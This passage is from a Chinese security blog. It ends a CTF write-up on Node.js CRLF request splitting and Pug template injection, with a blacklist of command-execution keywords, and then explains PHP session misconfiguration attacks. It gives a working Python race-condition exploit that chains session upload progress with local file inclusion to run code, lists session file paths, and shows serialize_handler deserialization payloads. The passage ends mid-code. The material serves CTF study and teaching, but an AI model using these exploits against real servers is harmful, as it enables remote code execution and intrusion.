failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line"></span><br><span class="line">                resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        resps = chunk.toString();</span><br><span class="line">                        res.send(resps);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.send(e.message);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                    res.send(e.message);&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>代码的意思蛮好理解的，主要看几个路由的作用吧</p>
<ul>
<li>file_upload路由：通过dest中间件进行文件上传，并且限制了ip只能为127.0.0.1</li>
<li>core路由：拼合传入q参数与之前的url 传入http.get进行请求</li>
</ul>
<p>其实仔细看core路由就会发现拼合的这个url 的host就是127.0.0.1 也就是我们上传文件所需要的，不难想到直接可以通过crlf拆分http把我们上传的posti请求直接加在这个host为127.0.0.1的请求中，并且我们可以通过文件类型进行跨目录上传</p>
<p>然而拼包..一直503…</p>
<p>赛后看了下exp 应该是由于发送了不完整了http请求导致的</p>
<p>官方的exp链接</p>
<p><a href="https://blog.5am3.com/2020/02/11/ctf-node1#nullcon-HackIM-2020-split-second" target="_blank" rel="noopener">https://blog.5am3.com/2020/02/11/ctf-node1#nullcon-HackIM-2020-split-second</a></p>
<p>看exp就比较容易理解了</p>
<p>最后简单的说一下服务端处理的流程吧。</p>
<p>首先看一下node对字符的一些处理</p>
<blockquote>
<p>虽然用户发出的<code>http</code>请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，例如</p>
</blockquote>
<p>所以对于后端buffer处理为如下：</p>
<p><img src="https://s2.ax1x.com/2020/02/24/3JCumn.png" alt="3JCumn.png"></p>
<p>所以这就可以进行拆分crlf进行攻击了</p>
<p>（下次直接用py处理完整的文件上传包…绝不手拼）</p>
<p>上传的pug文件通过#{}或者-进行SSTI都可以，也可以用include语法</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>PS：希望可以快速成长起来，现在还是远远不够啊..加油吧！</p>
<p>感觉似乎越来越能接受理性和排斥感性了…但偶尔还是会很感性。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>php-session配置不当产生的安全问题</title>
    <url>/2019/07/09/php-session%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="PHP中的Session机制介绍"><a href="#PHP中的Session机制介绍" class="headerlink" title="PHP中的Session机制介绍"></a>PHP中的Session机制介绍</h3><p>这里主要介绍的<code>PHPSESSIONID</code>是怎么建立起<code>session</code>与<code>cookie</code>之间的联系，以及<code>session_start()</code>函数所起的作用，看了一些文    章，在segmentfault上感觉讲的很棒，拿到引用一下</p>
<blockquote>
<p><strong>①如果session机制是基于cookie的，那么当脚本第一次运行的时候</strong><br>A、 在客户端上session_start()函数会通过setCookie()函数向Cookie中保留一个key，默认情况下Key的名字是PHPSESSID，对应的值是一个32位的、唯一的、随机的字符串！<br>B、 在服务器端，会产生一个以PHPSESSID的value值为名字的文件！其中保留的是session中的数据！同时，在脚本中创建$_SESSION超全局数组，并将session文件的数据反序列化，添加到$_SESSION数组中！</p>
<p><strong>②当脚本第二次，及以后运行的时候</strong><br>A、 浏览器端会自动携带COOKIE中的PHPSESSID对应的value值，将数据送至服务器端！<br>B、在服务器端，一旦开启sessioin_start()的时候，会根据客户端提供的sessionid去寻找对应的session文件，将session中的变量读取出来！在脚本中创建$_SESSION超全局数组，将数据定义到$_SESSION数组中！</p>
<p>注意：$_SESION数组数组只有在调用session_start()函数之后，更确切确切的说，是开启session机制之后]才会存在！之所以这样说，是由于session_start()时，会先得到session_id，通过session_id找到对应的文件内容，然后进行反序列化！如果，我们接着使用session_id()函数来滞空session_id的话，我们就找不到session中的内容了！<br>同时，$_SESSION是超全局定义数组，他和常量一样，并没有作用域的概念！几乎在哪里都可以使用！</p>
</blockquote>
<p>文档中：通过为每个独立用户分配唯一的会话 ID，可以实现针对不同用户分别存储数据的功能。 会话通常被用来在多个页面请求之间保存及共享信息。 一般来说，会话 ID 通过 cookie 的方式发送到浏览器，并且在服务器端也是通过会话 ID 来取回会话中的数据。 如果请求中不包含会话 ID 信息，那么 PHP 就会创建一个新的会话，并为新创建的会话分配新的 ID。</p>
<p>会话的工作流程很简单。当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 cookie）， 如果请求中不包含会话 ID 信息，PHP 就会创建一个新的会话。 会话开始之后，PHP 就会将会话中的数据设置到 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/reserved.variables.session.php" target="_blank" rel="noopener">$_SESSION</a> 变量中。 当 PHP 停止的时候，它会自动读取 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/reserved.variables.session.php" target="_blank" rel="noopener">$_SESSION</a> 中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存。</p>
<p>默认情况下，PHP 使用内置的文件会话保存管理器（<code>files</code>）来完成会话的保存。 也可以通过配置项 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/session.configuration.php#ini.session.save-handler" target="_blank" rel="noopener">session.save_handler</a> 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/session.configuration.php#ini.session.save-path" target="_blank" rel="noopener">session.save_path</a> 所指定的位置。</p>
<p>可以通过调用函数 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener">session_start()</a> 来手动开始一个会话。 如果配置项 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/session.configuration.php#ini.session.auto-start" target="_blank" rel="noopener">session.auto_start</a> 设置为<code>1</code>， 那么请求开始的时候，会话会自动开始。</p>
<h3 id="通过Session设置不当结合LFI进行getshell"><a href="#通过Session设置不当结合LFI进行getshell" class="headerlink" title="通过Session设置不当结合LFI进行getshell"></a>通过Session设置不当结合LFI进行getshell</h3><h4 id="原理讲解"><a href="#原理讲解" class="headerlink" title="原理讲解"></a>原理讲解</h4><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a>官方手册描述链接</p>
<p><img src="https://s2.ax1x.com/2019/07/08/ZsEbB8.png" alt="ZsEbB8.png"></p>
<p>通过文档的描述我们可以总结出原理为：<strong>当<code>session.upload_progress.enabled</code>选项开启，PHP能够在每一个文件上传时监测上传的进度，并且我们可以在上传的同时发送一个<code>POST</code>请求到终端。当上传文件处理中，同时<code>POST</code>一个与<code>INI</code>中设置的<code>session.upload_progress.name</code>同名变量时,当PHP检测到这样的<code>POST</code>请求时，会在session中添加这样的一组数据，索引是<code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值,后面是<code>session</code>的反序列化数据</strong>，格式大概如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">upload_progress_lihuaiqiu|a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">"start_time"</span>;i:<span class="number">1562585979</span>;s:<span class="number">14</span>:<span class="string">"content_length"</span>;i:<span class="number">271</span>;s:<span class="number">15</span>:<span class="string">"bytes_processed"</span>;i:<span class="number">271</span>;s:<span class="number">4</span>:<span class="string">"done"</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"files"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">"field_name"</span>;s:<span class="number">6</span>:<span class="string">"upload"</span>;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">0</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"tmp_name"</span>;N;s:<span class="number">5</span>:<span class="string">"error"</span>;i:<span class="number">4</span>;s:<span class="number">4</span>:<span class="string">"done"</span>;b:<span class="number">1</span>;s:<span class="number">10</span>:<span class="string">"start_time"</span>;i:<span class="number">1562585979</span>;s:<span class="number">15</span>:<span class="string">"bytes_processed"</span>;i:<span class="number">0</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用需求"><a href="#利用需求" class="headerlink" title="利用需求"></a>利用需求</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled = On</span><br><span class="line">session.upload_progress.cleanup = On</span><br><span class="line">session.upload_progress.prefix = <span class="string">"upload_progress_"</span></span><br><span class="line">session.upload_progress.name = <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span></span><br><span class="line">session.upload_progress.freq = <span class="string">"1%"</span></span><br><span class="line">session.upload_progress.min_freq = <span class="string">"1"</span></span><br></pre></td></tr></table></figure>

<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><h5 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h5><p>当可以获得目标网站的<code>phpinfo()</code>时，并且<code>phpinfo()</code>中设置如上，同时存在<code>LFI</code>漏洞，漏洞利用点就是在上传文件的同时，同时<code>POST</code>一个与<code>session.upload_progress.name</code>同名的变量，这个变量对应的值就会被记录到<code>session</code>文件中去，而这时我们的文件包含漏洞正好可以去包含这个<code>session</code>文件从而<code>getshell</code>。</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://127.0.0.1/index.php'</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">'PHPSESSID=123'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file=&#123;</span><br><span class="line">            <span class="string">"file"</span>:(<span class="string">''</span>,<span class="string">''</span>)                                                    <span class="comment">#上传无效的空文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="string">"&lt;?php phpinfo();?&gt;"</span>  </span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=file,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        event.wait()</span><br><span class="line">        t=r.get(<span class="string">"http://127.0.0.1/index.php?file=../tmp/tmp/sess_123"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'lihuaiqiu'</span> <span class="keyword">not</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">'[+]retry'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(t.text)</span><br><span class="line">            event.clear()</span><br><span class="line">event=threading.Event()</span><br><span class="line">event.set()</span><br><span class="line">threading.Thread(target=POST,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure>

<p>这里本地跑的有点慢，可能有点竞争不过<code>cleanup</code>，所以我是在本地关掉<code>cleanup</code>情况下测试的，其实效果是一样的，最终效果：</p>
<p><img src="https://s2.ax1x.com/2019/07/08/ZseAp9.png" alt="ZseAp9.png"></p>
<h5 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h5><p>其实用的是同一个原理，只不过操作不同而已，利用下面的表单</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://127.0.0.1"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> vaule=<span class="string">"&lt;?php phpinfo(); ?&gt;"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file1"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file2"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>本地抓包不断发包。</p>
<p>在发包的同时，再抓一个文件包含的包，再次进行不断请求，最终条件竞争成功。</p>
<p>但是一定要注意在抓<code>form</code>表单时要填写自己的<code>PHPSESSID</code>(这个坑踩了好久…)，下面是成功的截图</p>
<p><img src="https://s2.ax1x.com/2019/07/09/Zsoalt.png" alt="Zsoalt.png"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>其实最终能成功<code>getshell</code>的原因就是在一个新的<code>session</code>文件,<code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值是这个文件种的索引，而<code>session.upload_progress.name</code>对应值正好就是我们<code>post</code>的，对应着exp脚本中 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">            <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="string">"&lt;?php phpinfo();?&gt;"</span>  </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>所以再跟着一个文件包含就可以<code>getshell</code>了。</p>
<h3 id="服务器中常见的session文件所在位置"><a href="#服务器中常见的session文件所在位置" class="headerlink" title="服务器中常见的session文件所在位置"></a>服务器中常见的session文件所在位置</h3><p>再进行<code>session</code>危险操作的时候，很多都是需要知道<code>Session</code>文件位置的，<code>Unix</code>常见的位置如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/sess_PHPSESSID</span><br><span class="line"></span><br><span class="line">/<span class="keyword">var</span>/lib/php5/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php5/sessions/sess_PHPSESSID</span><br><span class="line"></span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>

<p><code>windows</code>常见的位置在与<code>www</code>同目录的<code>tmp/tmp/sess_xxx</code>。</p>
<h3 id="session-serialize-handler处理不当造成反序列化漏洞"><a href="#session-serialize-handler处理不当造成反序列化漏洞" class="headerlink" title="session.serialize_handler处理不当造成反序列化漏洞"></a><code>session.serialize_handler</code>处理不当造成反序列化漏洞</h3><p>首先还是先来看一些配置的东西</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session.save_path=<span class="string">""</span>   --设置session的存储路径</span><br><span class="line">session.save_handler=<span class="string">""</span> --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start   boolen --指定会话模块是否在请求开始时启动一个会话,默认为<span class="number">0</span>不启动</span><br><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure>

<p>来更直观看一眼<code>phpinfo</code>中的</p>
<p><img src="https://s2.ax1x.com/2019/07/08/ZsmTPg.png" alt="ZsmTPg.png"></p>
<p><code>session.save_handler=files</code>表明<code>session</code>是以文件的方式来进行存储的(默认)，<code>session.save_handler</code>表明<code>session</code>的默认序列化引擎为<code>php</code>序列化引擎。</p>
<p>除了默认的<code>php</code>引擎，还有其他几种不同的引擎，下面来一一介绍一下：</p>
<ul>
<li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
<li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
<li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li>
</ul>
<p><strong><code>php_serialize</code>引擎</strong></p>
<p><img src="https://s2.ax1x.com/2019/07/08/Zslibn.png" alt="Zslibn.png"></p>
<p><strong><code>php</code>引擎</strong></p>
<p><img src="https://s2.ax1x.com/2019/07/08/Zsl7GT.png" alt="Zsl7GT.png"></p>
<p><strong><code>php_binary</code>引擎</strong></p>
<p>这里会有第一个<code>ascii</code>字符是由键名<code>chr()</code>而来的，而我这里的键名是<code>name</code>,所以真实的形式是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;0x04&gt;names:9:&quot;lihuaiqiu&quot;;</span><br></pre></td></tr></table></figure>

<p>在<code>winhex</code>中打开更明显，看一下：</p>
<p><img src="https://s2.ax1x.com/2019/07/08/ZsG779.png" alt="ZsG779.png"></p>
<h4 id="php引擎和php-serialize引擎使用不当造成的反序列化"><a href="#php引擎和php-serialize引擎使用不当造成的反序列化" class="headerlink" title="php引擎和php_serialize引擎使用不当造成的反序列化"></a><code>php</code>引擎和<code>php_serialize</code>引擎使用不当造成的反序列化</h4><p>php引擎进行序列化的结果格式如：<code>name | s:9:&quot;lihuaiqiu&quot;;</code>,键名+竖线+经过序列化后的数据。</p>
<p>php_serialize引擎序列化后的结果：经过<code>serialize()</code>函数序列化处理的值。</p>
<p>那么为什么说这两个引擎的使用不当会造成反序列化呢？</p>
<p>首先通过以下代码生成一下反序列化数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lihuaiqiu</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$huai=<span class="keyword">new</span> lihuaiqiu();</span><br><span class="line"><span class="keyword">echo</span> serialize($huai);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成后为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">9</span>:<span class="string">"lihuaiqiu"</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们此时的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'|O:9:"lihuaiqiu":0:&#123;&#125;'</span>;</span><br></pre></td></tr></table></figure>

<p>在session文件中生成的序列化数据为</p>
<p><img src="https://s2.ax1x.com/2019/07/09/Zsocfs.png" alt="Zsocfs.png"></p>
<p>但是在<code>php</code>引擎反序列化处理时，<code>|</code>会作为key与value的分隔符，所以就会把<code>a:1:{s:4:&quot;name&quot;;s:21:&quot;</code>作为key，将我们的<code>O:9:&quot;lihuaiqiu&quot;:0:{}&quot;;}</code>作为<code>value</code>，最后对<code>value</code>进行反序列化，成功获得我们构造的<code>lihuaiqiu</code>类，造成反序列化漏洞。</p>
<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>这里的代码直接借用了<code>spook</code>师傅博客里的了，稍微改了一点。</p>
<p>test1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">"spoock"</span>]=$_GET[<span class="string">"a"</span>];</span><br></pre></td></tr></table></figure>

<p>test2.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $hi;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hi = <span class="string">'a;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;hi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用反序列化构造a的数据为<code>|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;}</code>，传入后访问test2.php，最终得到phpinfo页面成功进行反序列化。</p>
<p>下面是一个实战题目，但是在看的时候又引发了我对反序列化漏洞的很多思考，所以还是先记录一下我的思考。</p>
<p><strong>以后还是把反序列化攻击叫做属性注入攻击吧，因为简直实在真的是太贴切了。</strong></p>
<p>首先还是一道CTF题目，国赛的签到题<code>Justsoso</code>，缩减版源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;       </span><br><span class="line">    <span class="keyword">private</span> $handle;        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;           </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;       </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;      </span><br><span class="line">    <span class="keyword">public</span> $file;      </span><br><span class="line">    <span class="keyword">public</span> $token;      </span><br><span class="line">    <span class="keyword">public</span> $token_flag;         </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));      </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)&#123;     </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;      </span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>);               </span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$lihuaiqiu=unserialize($_GET[<span class="string">'payload'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于我之前写的<code>poc</code>,也来贴下吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;</span><br><span class="line">        <span 